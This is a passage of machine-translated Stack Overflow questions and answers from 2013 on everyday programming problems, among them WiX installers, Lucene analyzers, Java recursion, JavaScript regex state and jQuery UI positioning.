所以我需要两件事之一的帮助。一，有没有办法让mailto：在另一个页面上打开并在电子邮件客户端“捕获”后自动关闭？如果这不可能，是什么导致 mailto: 破坏 jQuery/Backbone.js 事件？我会从哪里开始寻找？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-06T21:10:13.913

仍然没有确定是什么原因造成的，但我已经完成了寻找它。只是在这里回答以清理我的问题。

# visual-studio-2010 - Visual Studio 安装项目在每个用户登录时要求 MSI

> ID：16091502
> 
> 赞同：1
> 
> 时间：2013-04-18T19:29:25.197
> 
> 标签：visual-studio-2010, windows-installer, visual-studio-setup-proje

我有一个使用 Visual Studio 安装项目（VS 2010）安装的 Windows 应用程序。

该应用程序旨在为所有用户安装。我可以在测试虚拟机（Windows 7）上很好地安装这个应用程序。我以具有管理员权限的用户身份安装它。我看到 UAC 提示并确认没问题。我还选择了为所有人安装而不是为我安装的选项。

应用程序快捷方式被添加到 Startup 文件夹，因为它也意味着在登录时运行。

该应用程序对于安装它的用户来说运行良好，但是当另一个用户登录到该 vm 时，我得到以下信息：

![微星错误](https://i.stack.imgur.com/684g6.png)

它无法加载 MSI，因为我是从用户桌面安装的，显然该机器上的其他用户无权访问该用户的桌面。

为什么会这样做？我有另一个类似的应用程序，我以完全相同的方式安装，但我从来没有让其他用户这样提示我。我能找到的唯一区别是这个应用程序在 Startup 文件夹中添加了一个图标，而我的其他工作应用程序没有。

运行 MSI 安装程序后，我需要为所有用户完全安装我的应用程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T21:33:53.687

似乎有什么东西导致您的应用程序被修复。然后，修复需要原始源成功并询问安装 MSI 的位置。

首先要做的是使用事件日志来追踪导致修复启动的原因。您应该在 Windows 安装程序的事件日志中看到一些内容，告诉您导致问题的组件 Guid。这应该可以帮助您找到罪魁祸首。获取详细的日志文件会很有帮助。设置[MSI 日志记录策略](http://support.microsoft.com/kb/223300)可以轻松实现。

要解决第二个问题，您需要获取原始 MSI 并导航到它。这将为您的用户可以访问的 MSI 注册另一个源。一般来说，我的建议是不要从每个用户的位置运行安装。WiX 工具集 bootstrapper/chainer，Burn，通过将包缓存到所有用户可以看到的每台机器的位置来处理这个问题。

# noise - 如何设置可接受的最低识别精度？

> ID：16091503
> 
> 赞同：1
> 
> 时间：2013-04-18T19:29:38.140
> 
> 标签：noise, threshold, sphinx4

我需要识别长语音音频文件（wav）中的关键词。可能有不同的噪音、咔哒声、叮当声等。这些声音通常被识别为关键字。

如何设置一些阈值来正确区分单词？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:34:01.070

你不能这样设置。sphinx4 不支持关键字定位功能。

# sonarqube - 是否有可用于声纳结果的行业标准数字？

> ID：16091506
> 
> 赞同：0
> 
> 时间：2013-04-18T19:29:57.187
> 
> 标签：sonarqube, code-metrics

Sonar 产生了很好的数字设置，我想知道它创建的这些索引是否有可用的行业标准或阈值数字？我可以假设一些数字，比如我们必须达到 100% 的单元测试覆盖率，所以 80% 以上的任何东西都是好的。重复必须为 0%。违规，我们需要将其设为 0。我想对于 RCI，我们也需要达到 100%。我不确定复杂性。我们必须达到的平均数字是多少？

＃/方法

＃/班级

＃/文件

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T10:49:33.467

这些指标没有行业标准。

但是，通常承认每个方法的复杂度不应超过 10 - 这是 Sonar 中“避免过于复杂的方法”规则的默认阈值。

# java - 仅将文件中的特定文本添加到数组列表，第 2 部分 - Java

> ID：16091509
> 
> 赞同：-1
> 
> 时间：2013-04-18T19:30:12.847
> 
> 标签：java, arraylist, text-files

我希望我能有一些很好的建议，我可以在这里解决这个问题：

我有这个包含地点和名称的文本文件 - 名称详细信息表示此人访问过的地点：

```
Place: New York
Place: London
Place: Paris
Place: Hongkong

1\. Name: John
1\. Name detail: London
1\. Name detail: Paris
1\. Name detail: Hongkong

2\. Name: Sarah
2\. Name detail: London

3\. Name: David
3\. Name detail: New York
3\. Name detail: Paris 
```

这是我的代码的一部分。

```
private ArrayList<Place> places = new ArrayList<>();
private ArrayList<Name> names = new ArrayList<>();

public void load(String fileName) throws FileNotFoundException {
    ArrayList<Place> place = places;
    BufferedReader br = new BufferedReader(new FileReader(fileName));
    int nameCounter = 1;
    int nameDetailCounter = 1;
    String text;

    try {
        while ((text = br.readLine()) != null) {     
            if (text.contains("Place:")) {
                text = text.replaceAll("Place:", "");
                places.add(new Place(text));
            } else if (text.contains(nameCounter + ". Name:")) {
                text = text.replaceAll(nameCounter + ". Name:", "");
                names.add(new Name(text, ""));
                nameCounter ++;
            }
                //starting from here!
                else if (text.contains(nameDetailCounter + ". Name detail:")) {
                text = text.replaceAll(nameDetailCounter + ". Name detail:", "");
                for (Name name : names) {
                    Name nameDetails = findName(name.getName());
                    Place placeDetails = findPlace(text);
                    nameDetails.addName(placeDetails);  
                }
                nameDetailCounter ++;
            }
        }
    } catch (Exception e) {
        System.err.println("Error: " + e.getMessage());
    }
} 
```

我的想法是全选“1”。首先从文本文件中将其添加到数组中，然后继续所有“2”。并将其添加到数组中，依此类推。

我尝试了很多方法，但它没有添加以“1”开头的所有名称详细信息。在数组中。我感谢任何新的想法或建议，谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:46:24.297

与其拥有 Name 类，不如使用具有`String name`and的 Traveler 类`List<Place> places`？然后，您可以`add(Place p)`在 Traveler 类上有一个方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T05:11:44.587

最好使用正则表达式来提取线上的数字，而不是尝试跟踪/猜测它（见下文）。

这是您的代码的经过测试的重新创建，因为您引用了一些您没有提供的类......但这应该会有所帮助：

```
public static String getMatch(final String pattern, final String content) {
    Pattern r = Pattern.compile(pattern);
    Matcher m = r.matcher(content);

    if (m.find()) {
        return m.group(1);
    } else {
        return "";
    }
}

public static void load(String fileName) throws FileNotFoundException {

    List<String> places = new ArrayList<String>();
    List<String> names = new ArrayList<String>();
    List<String> nameDetails = new ArrayList<String>();

    BufferedReader br = new BufferedReader(new FileReader(fileName));

    String text;
    String lastName = "";

    try {

        while ((text = br.readLine()) != null) {
            // extract num from start of line or empty if none..
            String num = getMatch("^([0-9]+)\\.", text);

            if (text.contains("Place:")) {
                text = text.replaceAll("Place:", "");
                places.add(text);
            } else if (text.contains(num + ". Name:")) {
                text = text.replaceAll(num + ". Name:", "");
                names.add(text);
                lastName = text;
            } else if (text.contains(num + ". Name detail:")) {
                text = text.replaceAll(num + ". Name detail:", "");
                nameDetails.add(lastName + " had " + text);
            }
        }
    } catch (Exception e) {
        System.err.println("Error: " + e.getMessage());
    }

    System.out.println("Places:" + places);
    System.out.println("Names:" + names);
    System.out.println("Name Details:" + nameDetails);
} 
```

# android - 是否可以将 UI 元素注入测试用例？（RoboGuice、Robolectric、Android）

> ID：16091511
> 
> 赞同：0
> 
> 时间：2013-04-18T19:30:17.210
> 
> 标签：android, robolectric, roboguice

我想出了如何使用 Robolectric 和 RoboGuice 将非 UI 元素 (Android) 注入测试类。不幸的是，我无法弄清楚如何将 Android-UI-Elements 注入测试类。

在 RoboGuice 和 Robolectric 目前的发展状态下，这可能吗？

如果可能的话，有人可以提示我在哪里可以找到教程或提供一些小代码示例吗？如果现在不可能，提示也会很好。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-02T21:17:16.953

不，这是不可能的。InjectView 代码只接受一个作为源和目标的参数。因此，您不能将活动中的视图引用注入另一个对象。

您可以查看源以获取更多信息： [https ://github.com/roboguice/roboguice/blob/master/roboguice/src/main/java/roboguice/inject/ViewListener.java#L162](https://github.com/roboguice/roboguice/blob/master/roboguice/src/main/java/roboguice/inject/ViewListener.java#L162)

# wix - 带有子文件夹的开始菜单

> ID：16091512
> 
> 赞同：3
> 
> 时间：2013-04-18T19:30:18.043
> 
> 标签：wix, wix3.5

我使用 WiX 并想在用户的开始菜单中创建快捷方式，例如

开始 -> [公司名称] -> [程序名称] -> App.exe

我可以这样做

开始 -> [程序名称] -> App.exe

没有任何问题：

```
 <Directory Id="ProgramMenuFolder">
    <Directory Id="ProgramMenuDir" Name="RoverSoft Test">
    </Directory>
  </Directory>      
</Directory>

<DirectoryRef Id="ProgramMenuDir">
  <Component Id="ProgramMenuDirComponent" Guid="{A9858D4C-085A-4132-AD2E-F90A1E5C64A6}">
    <RemoveFolder Id="ProgramMenuDir" On="uninstall" />
    <RegistryValue Root="HKCU" Key="Software\[Manufacturer]\[ProductName]" Type="string" Value="" KeyPath="yes" />
  </Component>
</DirectoryRef> 
```

但是，如果我再添加一级文件夹，则会出现错误：错误 1 ​​ICE64：目录 ProgramMenuSubDir 在用户配置文件中，但未列在 RemoveFile 表中。

据我了解，这意味着我应该在系统卸载后完全清除（在这种情况下从注册表）。怎么做？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T21:42:24.943

对于用户配置文件中的每个文件夹，您都需要确保删除该文件夹。因此，您可以像这样调整示例：

```
<Directory Id='TARGETDIR' Name='SourceDir'>
  <Directory Id="ProgramMenuFolder">
    <Directory Id="ProgramMenuCompanyDir" Name="Company Name">
       <Directory Id="ProgramMenuProgramDir" Name="ProgramName"/>
    </Directory>
  </Directory>
</Directory>

<Component Id="ProgramMenuCompanyDirComponent" Directory='ProgramMenuCompanyDir'>
  <RegistryValue Root="HKCU" Key="Software\[Manufacturer]\[ProductName]" Name='InstallVersion'
                 Value="[ProductVersion]" Type="string" />
  <RemoveFolder Id="RemoveProgramMenuCompanyDir" On="uninstall" />
</Component>

<Component Id="ProgramMenuProgramDirComponent" Directory='ProgramMenuProgramDir'>
  <RegistryValue Root="HKCU" Key="Software\[Manufacturer]\[ProductName]" Name='InstallFolder'
                 Value='[INSTALLFOLDER]' Type="string" />
  <RemoveFolder Id="RemoveProgramMenuProgramDir" On="uninstall" />
</Component> 
```

这可确保所有每用户文件夹都具有每用户密钥路径（注册表项），并正确标记为在卸载期间删除。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:32:30.137

这是我的代码。

```
<Fragment>
    <Directory Id="TARGETDIR" Name="SourceDir">
        <Directory Id="ProgramFiles64Folder">
      <Directory Id="company" Name="company">
        <Directory Id="INSTALLFOLDER" Name="prod" >
         <Directory Id="INCLUDEDIR" Name="include">
         <Directory Id="THIRDPARTYDIR" Name="3rdParty">
         <Directory Id="BIN" Name="bin"></Directory>

         </Directory>  
        </Directory>
       </Directory>
      </Directory>
    </Directory>

 <Directory Id="ProgramMenuFolder" Name="Programs">
    <Directory Id="ProgramMenuDir" Name="prod">
      <Component Id="ProgramMenuDir" Guid="0118D11A-0CA3-4E04-8D27-0B73A279A7FD">
        <RemoveFolder Id='ProgramMenuDir' On='uninstall' />
        <RegistryValue Root='HKCU' Key='Software\[Manufacturer]\[ProductName]' Type='string' Value='' KeyPath='yes' />
      </Component>

    </Directory>
  </Directory>
 <Directory Id="DesktopFolder" Name="Desktop"/>
</Directory>
</Fragment> 
```

快捷方式将如下所示：

```
 <DirectoryRef Id="INSTALLFOLDER">
    <Component Id="comp_bin_debug_30" Guid="EB4650EB-75DC-4562-9DC3-8FFDD9B55468">
    <File Id="file_bin_30" Source="..\bin\Debug.amd64\prod.exe" KeyPath="yes" DiskId="1" />
      <Shortcut Id="desktopProd" Directory="DesktopFolder" Name="prod"
      WorkingDirectory='INSTALLFOLDER' Icon="prod_GUI.ico" IconIndex="0" Advertise="yes" />
      <Shortcut Id="startmenuProd" Directory="ProgramMenuDir" Name="prod"
      WorkingDirectory='INSTALLFOLDER' Icon="prod_GUI.ico" IconIndex="0" Advertise="yes" />      
     </Component>
   </DirectoryRef> 
```

# java - 在 Lucene 索引中搜索特定术语

> ID：16091515
> 
> 赞同：1
> 
> 时间：2013-04-18T19:30:24.347
> 
> 标签：java, database, lucene

我正在尝试使用一些我知道已编入索引的特定单词对 Lucene 索引进行搜索，但结果不是很好。

如何对特定术语（“129202”）执行查询？我尝试在字符串的开头添加加号，但它不起作用。

我的查询：

```
QueryParser q = new QueryParser(Version.LUCENE_42, "tags", new SimpleAnalyzer(Version.LUCENE_42));
Query query = q.parse("sapatilha feminina ramarim 129202 cinza"); 
```

下面是我想要获取的索引文档（xml）

```
<?xml version="1.0" encoding="UTF-8"?>
<product>
 <tags>
   <tag>Sapatilha Pedras Preto</tag>
   <tag>ramarin</tag>
   <tag>ramarin 129202</tag>
   <tag>preto</tag>
 </tags>
 <id>71</id>
 <url>http://www.dafiti.com.br/Sapatilha-Pedras-Preto-1135428.html</url>
</product> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T21:29:54.867

[SimpleAnalyzer](http://lucene.apache.org/core/4_0_0/analyzers-common/org/apache/lucene/analysis/core/SimpleAnalyzer.html)是您用来查询（我假设索引）的分析器，它使用[LetterTokenizer](http://lucene.apache.org/core/4_0_0/analyzers-common/org/apache/lucene/analysis/core/LetterTokenizer.html)，根据文档：

> ...将标记定义为相邻字母的最大字​​符串，由 java.lang.Character.isLetter() 定义

也就是说，不是数字。此分析器将完全丢失数字。我建议您研究一个不同的，例如[StandardAnalyzer](http://lucene.apache.org/core/4_0_0/analyzers-common/org/apache/lucene/analysis/standard/StandardAnalyzer.html)或[WhitespaceAnalyzer](http://lucene.apache.org/core/4_0_0/analyzers-common/org/apache/lucene/analysis/core/WhitespaceAnalyzer.html)。

* * *

展示：

```
StringReader reader = new StringReader("ramarim 129202 cinza");
LetterTokenizer stream = new LetterTokenizer(Version.LUCENE_42, reader);        
stream.setReader(reader);
stream.reset();
while(stream.incrementToken()) {
    System.out.println(stream.reflectAsString(false));
}
stream.close(); 
```

输出：

```
term=ramarim,bytes=[72 61 6d 61 72 69 6d],startOffset=19,endOffset=26
term=cinza,bytes=[63 69 6e 7a 61],startOffset=34,endOffset=39 
```

替换`StandardTokenizer`（由 使用`StandardAnalyzer`）将为您提供：

```
term=ramarim,bytes=[72 61 6d 61 72 69 6d],startOffset=19,endOffset=26,positionIncrement=1,type=<ALPHANUM>
term=129202,bytes=[31 32 39 32 30 32],startOffset=27,endOffset=33,positionIncrement=1,type=<NUM>
term=cinza,bytes=[63 69 6e 7a 61],startOffset=34,endOffset=39,positionIncrement=1,type=<ALPHANUM> 
```

# git - bitbucket 中的 git 服务器端“更新”挂钩

> ID：16091516
> 
> 赞同：3
> 
> 时间：2013-04-18T19:30:24.593
> 
> 标签：git, bitbucket, githooks

我正在寻找创建 git 服务器端推送钩子的方法（将用于强制在每个提交消息中引用 JIRA 票号）。

根据[pro git - git hooks](http://git-scm.com/book/en/Customizing-Git-Git-Hooks)，在服务器端使用的 git hook 是“更新”，它存在于 .git/hooks 目录中。由于我使用 BitBucket 进行 git 托管，因此我需要以某种方式将此文件发送到站点中的 .git/hooks 目录。

使用[BitBucket 服务](https://confluence.atlassian.com/display/BITBUCKET/Managing+Bitbucket+Services)不合适，因为它们是“接收后”挂钩，所以使用现有的或编写我自己的代理没有意义，因此[这个问题](https://stackoverflow.com/questions/9107320/create-a-bitbucket-git-commit-hook)没有给我一个合适的解决方案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-06T17:01:20.113

[显然，根据我在answers.atlassian.com](https://answers.atlassian.com/questions/165991/enable-an-update-hook-in-bitbucket-git-repository?page=1#166491)上得到的答案，这是不可能的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-07-07T08:57:01.050

不幸的是，Bitbucket Server 没有提供 API 或 UI 来安装`update`挂钩。它仅支持`pre-receive`和`post-receive`挂钩该级别。但是，由于 Bitbucket Server 在后端使用泛型`git`，因此确实可以安装任何标准的 git 挂钩。

这种方法需要对安装了 Bitbucket Server 的主机具有 admin/root 权限的文件系统访问权限。

`shared/config/git/template/hooks`当您创建新存储库时，挂钩位于每个存储库挂钩目录中并自动复制到其中。要为现有存储库安装自定义挂钩，请在`shared/data/repositories/<repo_number>/hooks`.

我创建了一个现成的解决方案，用于使用可配置的用户名和密码针对可配置的 JIRA 主机验证提交日志。该解决方案验证以下内容：

*   符合 Linux 内核风格的日志格式（50/72 规则）
*   摘要中存在 JIRA 问题密钥
*   JIRA 发布受让人的电子邮件与提交者的电子邮件匹配
*   JIRA 问题状态为“进行中”

您可以在此处下载文件： [https ://github.com/AlexanderAmelkin/bitbucket-git-hooks-for-jira](https://github.com/AlexanderAmelkin/bitbucket-git-hooks-for-jira)

为了可移植性，主要的验证脚本是用 Javascript for node.js 编写的，可用于 Windows 和 Linux。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-20T14:10:59.823

我知道 JIRA 现在与 Bitbucket 集成。您只需要一个[JIRA Bitbucket 插件](https://marketplace.atlassian.com/plugins/com.atlassian.jira.plugins.jira-bitbucket-connector-plugin)

# winapi - Win32 API 组合框问题

> ID：16091517
> 
> 赞同：0
> 
> 时间：2013-04-18T19:30:31.633
> 
> 标签：winapi, combobox

我的窗口中有一个组合框；而且我能够完美地向组合框添加元素但是当我尝试删除一个或所有项目时，没有项目被删除。根据 Spy++ 消息 WM_DELETEITEM 发送但是组合框没有收到消息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:35:54.233

您不会发送`WM_DELETEITEM`删除项目，一旦控件完成删除项目，它就会发送回给您。改为使用[`CB_DELETESTRING`](http://msdn.microsoft.com/en-us/library/windows/desktop/bb775830%28v=vs.85%29.aspx)。

# nsis - NSIS 设置后 MFU（使用频率最高）开始菜单中的固定快捷方式

> ID：16091518
> 
> 赞同：0
> 
> 时间：2013-04-18T19:30:33.383
> 
> 标签：nsis

NSIS 创建的部署设置，安装两个可执行文件。设置后，其中之一会出现在开始菜单的 MFU（最常用频率）列表中。但我不这样。

是否可以在安装过程中删除此链接或阻止它？我[从 Microsoft 找到了这个文档，](http://msdn.microsoft.com/en-us/library/windows/desktop/hh127439%28v=vs.85%29.aspx)但是很难编写代码（我知道的是 .NET/C#）。或者也许 NSIS 有可能吗？欢迎所有提示。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:43:01.427

你可以用`WriteRegStr`它来写 NoStartPage 值，但它通常不是你应该明确设置的，除非这个 .exe 是插件模块的某种通用主机程序。

是否有可能您只是在这台特定机器上多次测试了该程序，以至于该程序最终出现在 MFU 列表中？

没有官方 API 可以将东西添加到 MFU 列表中，NSIS 也没有做任何事情来尝试将程序列在那里......

# java - Java处理stackoverflow并在stackoverflow错误后继续正常执行

> ID：16091520
> 
> 赞同：1
> 
> 时间：2013-04-18T19:30:38.337
> 
> 标签：java, recursion, stack-overflow

我正在尝试在 Java 中进行递归。我只想停止递归并继续正常的 prgram 执行

```
void doit(){
    try{
        doit();
    }
    catch (StackOverflowError e) {
        return;
    }
    System.out.println("Error");
}

statement1
doit()
statementcontinue 
```

`statementcontinue`我希望程序在 stackoverflow 错误之后继续执行

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:32:10.103

您的程序正在按照您的指示进行操作。

每次调用时`doit()`，它：

1.  `doit()`再次调用
2.  完成后，它会打印`Error`.

当堆栈溢出发生时，最里面的调用完成（因为你的`return`），然后继续执行调用它的函数（就像任何其他函数调用一样）。
这称为弹出调用堆栈。

调用函数（也是`doit()`）然后执行下一行（`System.out.println("Error");`），然后返回到*它的*调用函数，也就是`doit()`。
循环重复，直到堆栈完全弹出 - 直到它到达最初调用的函数`doit()`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T19:35:18.327

如果您只想在 stackOverflow 发生时打印“错误”，只需将跟踪放在 catch 块中：

```
void doit(){
  try{
    doit();
  }catch (StackOverflowError e) {
    System.out.println("Error");
    return;
  }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-18T19:33:21.213

您的代码会填满堆栈，然后一旦堆栈已满，它就会触发 catch 语句。之后，其余代码继续触发......每个错误消息都是一个递归调用。您的代码正在按照您的编程方式工作。

如果您想要一个在之前和之后执行操作并具有退出条件的递归示例，那么以下应该作为您的示例（使用打印语句来阐明堆栈上发生的事情）。

**例子：**

```
public class RecurseExample {

    public static void main(String[] args) {
        System.out.println("hi");
        doIt(1);
        System.out.println("bye");
    }

    private static void doIt(int i){
        if (i <= 3){
            System.out.println("i before: " + i);
            doIt(++i);
            System.out.println("i after: " + i);
        } else {
            System.out.println("this is where the recursion stops and the execution will continue to unravel the stack");
        }
    }
} 
```

**输出：**

```
hi
i before: 1
i before: 2
i before: 3
this is where the recursion stops and the execution will continue to unravel the stack
i after: 4
i after: 3
i after: 2
bye 
```

# javascript - 正则表达式测试函数不返回相同的依赖引号

> ID：16091522
> 
> 赞同：6
> 
> 时间：2013-04-18T19:30:49.863
> 
> 标签：javascript, regex, string

我在 javascript 中使用正则表达式有一个奇怪的情况：

```
var re = /[^\s]+(?:\s+|$)/g;
re.test('foo'); // return true
re.test("foo"); // return false 
```

正则表达式类型是否敏感？我的第一个目标是提取字符串的所有单词（由一个或多个空格分隔）。

谢谢你的帮助。

朱利安

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-18T19:35:38.643

在 Javascript 正则表达式上使用`g`标志时，它将跟踪找到最后一个匹配项的位置，并在您下次尝试查找匹配项时从该索引开始搜索。

在这两个`re.test()`电话之间，看看`re.lastIndex`我在说什么。

例如：

```
var re = /[^\s]+(?:\s+|$)/g;
re.test('foo'); // return true
re.lastIndex;   // 3
re.test("foo"); // return false 
```

您会注意到您使用的引号类型无关紧要，`re.test('foo'); re.test('foo');`将具有相同的行为。

如果您希望正则表达式重新开始，您可以从您的正则表达式中删除全局标志，或者在每次尝试查找匹配项后设置`re.lastIndex`为，例如：`0`

```
var re = /[^\s]+(?:\s+|$)/g;
re.test('foo'); // return true
re.lastIndex = 0;
re.test("foo"); // return true 
```

Blender在评论中注明的交替可以解释，因为匹配失败时`lastIndex`自动设置`0`，所以失败后的下一次尝试会成功。

# ios - 编译错误 AFNetworking ，语义问题？

> ID：16091531
> 
> 赞同：5
> 
> 时间：2013-04-18T19:31:21.470
> 
> 标签：ios, afnetworking

我正在使用教程“mobile.tutsplus.com/tutorials/iphone/ios-sdk_afnetworking/”来了解 AFNewtworking 的使用。我按照建议禁用了 ARC，但我认为该教程有点旧。因为最新版本的 AFNetworking 需要 ARC ？我尝试在没有 ARC 的情况下进行编译，它显示消息说需要 ARC。**我在启用 ARC**的情况下编译时看到以下编译错误。

 **```
 "/Users/user/Documents/NetworkingisFun/NetworkingisFun/AFNetworking-AFNetworking-215a32e/Example/Classes/AFAppDotNetAPIClient.m:54:40: Use of undeclared identifier 'AFSSLPinningModePublicKey'" 
```

有没有人见过这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-19T05:03:58.873

*   将缺少的变量添加到您的 .pch 文件中：
    #define _AFNETWORKING_PIN_SSL_CERTIFICATES_

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T08:20:18.120

错误消息表明您在 AFAppDotNetAPIClient.m 中没有#include 包含 AFSSLPinningModePublicKey 的头文件 (.h)。**

# php - 使用 Zend_Db_Table 访问远程服务器

> ID：16091536
> 
> 赞同：0
> 
> 时间：2013-04-18T19:31:41.820
> 
> 标签：php, mysql, zend-db

我当前的系统使用 Zend Framework 1，并且与我们的本地 MySQL 服务器配合得很好。但是，我现在需要访问另一台服务器进行导入/导出。我正在使用从 zend_db_table_abstract 扩展的类来查询必要的表。

```
class Model_Db_ExportData extends Zend_Db_Table_Abstract{
    protected $_name;
    protected $_schema;
} 
```

我在创建对象时实例化名称和架构

```
$export = new Model_Db_ExportData(array('name' => $this->exportTable, 'schema' => $this->db)); 
```

编辑据我所知，zend_db_table 不是定义主机的地方，因为它只影响表。但是，我仍然无法弄清楚我可以在哪里定义配置之外的主机。编辑

如何从我的配置中定义的服务器中指定一个单独的服务器？我是否需要为此代码使用自定义配置文件？Zend_Db_Table_Abstract 文档不是很有帮助，虽然它很大，我很容易错过一些东西。很感谢任何形式的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:44:19.943

至少有两种可能的方式来完成你想要的：

1.  [Zend_Db_Adapter](http://framework.zend.com/manual/1.12/en/zend.db.adapter.html) - 检查那里的示例以了解如何使用远程服务器设置创建适配器；
2.  [Zend_Config_Ini](http://framework.zend.com/manual/1.12/en/zend.config.adapters.ini.html) - 创建一个包含远程服务器设置的文件，然后调用您的应用程序。

# java - 实现 RESTful 服务

> ID：16091542
> 
> 赞同：0
> 
> 时间：2013-04-18T19:32:18.573
> 
> 标签：java, android, spring, rest, jax-rs

我正在构建一个 Web 服务来支持我正在为我们的校园杂志制作的 Android 电子阅读器应用程序。该服务需要将`issue`对象返回给应用程序，每个对象都有一个封面图片和一组要显示的文章。我想对我正在考虑的两种策略提供一些一般性意见，和/或对我遇到的一些问题提供一些具体帮助：

*   策略 1：拥有 2 个数据库表，`Issues`并且`Articles`：该`Issues`表仅包含一个`int id`,`varchar name`和`varchar imageURI`。`Articles`包含更多列（标题、内容、简介等），每篇文章位于单独的行中。其中一列是`issueID`，它指向文章所属的问题。当请求第 n 个问题时，服务首先从`Issues`表中提取其数据并使用它来创建一个新的问题对象。构造函数将 new 实例`List<Article>`化为实例变量，并通过从`Articles`桌子。我无法弄清楚这个选项究竟是如何在单个端点上执行它，因此应用程序只需创建一个 HTTP 连接即可获得解决问题所需的一切（或者这不像我认为的那么重要是？）。

*   有一个`Issues`包含 、 和 列的`id`表`name`，`imageURI`以及大量附加`text Article1... text Article40`列。文章在上传到服务器之前被打包成JSONObjects，这些JSONObjects（会很长）直接存储在数据库中。我担心的是文本文件会太长，而且我怀疑这种策略不符合最佳实践（尽管我无法解释为什么......）

另外，这是我的第一个 Web 服务，并且考虑到上面指定的要求，是否建议使用 Spring（或其他）框架，或者我最好只使用 JAX-RS？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:57:54.900

这里有2个问题

1.  如何将您的对象转换为 JSON 并使用休息服务公开它们。
2.  如何存储/检索您的数据。

要实现您的 Web 服务，Jersey 是我最喜欢的选择。它是 JSR 311 (JAX-RS) 的开源参考实现。此外，Jersey 使用 Jackson 来自动处理 JSON/Object 映射。

要存储您的数据，您的第二个选项......显然不是一个选项:) 第一个解决方案似乎可行。恕我直言，由于您的应用程序看起来很小，因此您不应该放置 JPA/Hibernate 等。您应该简单地在问题和文章之间使用 JOIN 手动发出一个请求，填充请求的问题，然后让杰克逊自动将您的对象转换为 JSON。

# asp.net - 如何在 MVC 应用程序中注册委托处理程序？（不是 Web API）

> ID：16091545
> 
> 赞同：2
> 
> 时间：2013-04-18T19:32:26.340
> 
> 标签：asp.net, asp.net-mvc

如何在 MVC 应用程序中注册全局消息处理程序？

我尝试在我的 Global.asax.cs 中注册它，但是当我访问从 System.Web.Mvc.Controller 继承的所有控制器中的任何端点时，这个处理程序**永远不会被调用。**

但是，当我访问从 System.Web.Http.ApiController 继承的所有控制器的路由时，它**确实会被调用。**

这就是我放入 Global.asax.cs 的内容：

```
protected void Application_Start()
{
    //other initializing stuff here
    **GlobalConfiguration.Configuration.MessageHandlers.Add(new AuthenticationHandler());** 
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:51:57.590

我相信你正在寻找`Filters`. 你可以构建这样的东西：

```
public class MyAuthorizationFilter : IAuthorizationFilter
{
    public void OnAuthorization(AuthorizationContext filterContext)
    {
        // do your work here
    }
} 
```

然后将其添加到全局过滤器列表中`Application_Start`：

```
GlobalConfiguration.Configuration.Filters.Add(new MyAuthorizationFilter()); 
```

# jquery - 为什么多次调用 jQuery UI 位置会导致不同的位置？

> ID：16091546
> 
> 赞同：5
> 
> 时间：2013-04-18T19:32:28.453
> 
> 标签：jquery, jquery-ui

使用 jQuery UI 定位 div 时，我遇到了一个奇怪的问题。第一次调用该函数会将 div 放在预期的位置。随后的调用将 div 放置在窗口的右侧和底部越来越远。以下是我可以重现该问题的最少代码量。

```
<!DOCTYPE html>
<html>
<head>
    <title>jQuery UI Position Test </title>
    <script src="http://code.jquery.com/jquery-1.8.3.js"></script>
    <script src="http://code.jquery.com/ui/1.10.2/jquery-ui.js"></script>
    <style type="text/css">
        #header {
            height: 100px;
            background: orange;
        }

        #content {
            height: 300px;
            background: blue;
        }

        #message {
            width: 300px;
            background: yellow;
            position: absolute;
            display: none;
        }
    </style>
</head>

<body>
    <div id="header"></div>
    <div id="message">a message to the user</div>
    <div id="content">
        <input id="ShowMessageButton" type="button" value="Show Message" />
    </div>

    <script>
        $(document).ready(function () {
            $('#ShowMessageButton').bind("click", function () {
                $('#message').position({ my: "center top", at: "center bottom-12", of: "#header" });
                $('#message').fadeIn(800).delay(1000).fadeOut(1000);
            });
        });
    </script>
</body>
</html> 
```

如果您第一次运行代码，这是我所期望的。

[屏幕截图 1 http://www.michaelware.net/OutsideImages/jQueryPositionIssue/Screen1.png](http://www.michaelware.net/OutsideImages/jQueryPositionIssue/Screen1.png)

第二次通话后

[屏幕截图 2 http://www.michaelware.net/OutsideImages/jQueryPositionIssue/Screen2.png](http://www.michaelware.net/OutsideImages/jQueryPositionIssue/Screen2.png)

第三次通话后

[屏幕截图 3 http://www.michaelware.net/OutsideImages/jQueryPositionIssue/Screen3.png](http://www.michaelware.net/OutsideImages/jQueryPositionIssue/Screen3.png)

请注意，您必须让淡入/淡出完成，否则问题不会发生。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-18T19:44:30.560

两件事情。First`.bind()`已被弃用，取而代之的是`.on()`. 其次，您需要将调用顺序更改为：

```
$('#ShowMessageButton').on("click", function () {
    $('#message').fadeIn(800).position({
        my: "center top",
        at: "center bottom-12",
        of: "#header"
    }).delay(1000).fadeOut(1000);
}); 
```

